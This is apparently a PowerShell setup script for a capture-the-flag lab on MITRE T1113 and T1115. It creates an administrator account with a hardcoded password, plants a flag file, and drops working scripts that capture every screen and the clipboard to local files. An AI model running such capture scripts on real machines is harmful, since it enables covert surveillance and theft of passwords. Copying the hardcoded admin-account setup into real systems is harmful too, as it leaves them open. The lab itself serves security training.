#Requires -RunAsAdministrator
$PlayerUsr = "player"; $PlayerPwd = ConvertTo-SecureString "Player@123!" -AsPlainText -Force
$FlagPath  = "C:\Windows\System32\flag_T1113.txt"
$Flag      = "HACKTIFY{SCREEN_CAPTURE_$($env:COMPUTERNAME)}"
if (-not (Get-LocalUser $PlayerUsr -EA SilentlyContinue)) {
    New-LocalUser $PlayerUsr -Password $PlayerPwd -FullName "Player" -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $PlayerUsr }
Set-Content $FlagPath $Flag
$acl = Get-Acl $FlagPath; $acl.SetAccessRuleProtection($true,$false)
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","Allow")))
Set-Acl $FlagPath $acl
# Create a screenshot capture script using .NET
$CaptureScript = @'
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$screens = [System.Windows.Forms.Screen]::AllScreens
$top = ($screens | Measure-Object -Property Bounds.Top -Minimum).Minimum
$left = ($screens | Measure-Object -Property Bounds.Left -Minimum).Minimum
$width = ($screens | Measure-Object -Property Bounds.Right -Maximum).Maximum - $left
$height = ($screens | Measure-Object -Property Bounds.Bottom -Maximum).Maximum - $top
$bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, $left + $width, $top + $height)
$bmp = New-Object System.Drawing.Bitmap($width, $height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($left, $top, 0, 0, $bounds.Size)
$outFile = "C:\Users\Public\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
$bmp.Save($outFile)
Write-Host "[+] Screenshot saved: $outFile"
$gfx.Dispose(); $bmp.Dispose()
$outFile
'@
$CaptureScript | Set-Content "C:\ProgramData\capture_screen.ps1"
# Also create a clipboard capture script
$ClipScript = @'
Add-Type -AssemblyName System.Windows.Forms
$clip = [System.Windows.Forms.Clipboard]::GetText()
if ($clip) {
    Write-Host "[+] Clipboard content ($($clip.Length) chars): $($clip.Substring(0,[Math]::Min(100,$clip.Length)))"
    $clip | Out-File "C:\Users\Public\clipboard_capture.txt"
} else { Write-Host "[*] Clipboard empty" }
'@
$ClipScript | Set-Content "C:\ProgramData\capture_clipboard.ps1"
Set-Content "C:\Users\Public\Desktop\README.txt" @"
=== T1113 Screen Capture + T1115 Clipboard ===
Login   : $PlayerUsr / Player@123!
Goal    : Capture screen and clipboard data as an attacker would.
Step 1 : Take screenshot: powershell -File C:\ProgramData\capture_screen.ps1
         View result: C:\Users\Public\screenshot_*.png
Step 2 : Copy something to clipboard, then capture it:
         Set-Clipboard "Test password: P@ssw0rd123"
         powershell -File C:\ProgramData\capture_clipboard.ps1
         type C:\Users\Public\clipboard_capture.txt
Step 3 : Retrieve the flag: type $FlagPath
"@
Write-Host "[+] T1113 setup complete."
